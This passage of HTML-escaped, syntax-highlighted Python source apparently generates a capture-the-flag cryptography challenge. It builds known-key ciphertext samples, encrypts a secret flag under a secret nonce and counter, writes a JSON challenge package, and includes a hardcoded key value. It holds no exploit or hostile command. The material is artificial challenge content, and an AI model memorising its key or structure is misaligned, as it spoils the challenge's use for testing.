    &lt;span class=&quot;n&quot;&gt;base_learning_nonce_suffix_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;base_learning_counter_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sample_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;nonce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;current_nonce_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;increment_byte_array_le&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_learning_nonce_suffix_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;current_nonce_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;current_counter_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_learning_counter_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sample_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sample_n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;c_i_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds_to_run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;get_bytes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;learning_dataset_entries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sample_id&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sample_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;plaintext_hex&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ciphertext_hex&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_i_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;nonce_hex&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;counter_int&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sample_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;  Generated learning data for nonce variation &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Generated &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sample_count&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; total learning samples.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p_secret_flag_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Encrypting the secret flag string (&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;) with the KNOWN key using SECRET target_nonce/counter...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;c_target_flag_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_secret_flag_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds_to_run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;c_target_flag_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_target_flag_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;challenge_package_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cipher_parameters&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known_structured_key_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;common_plaintext&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;learning_dataset_for_player&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;learning_dataset_entries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;flag_ciphertext&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_target_flag_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge_package_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;indent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Successfully wrote challenge package to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;IOError&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FATAL ERROR: Could not write package &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CTF Data generation complete.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;5c54700231f4727bf7d49234e7bbb1c9&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatter_class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RawTextHelpFormatter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--output_file&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ctf_challenge_package_test.json&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Filename for the single JSON challenge package.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
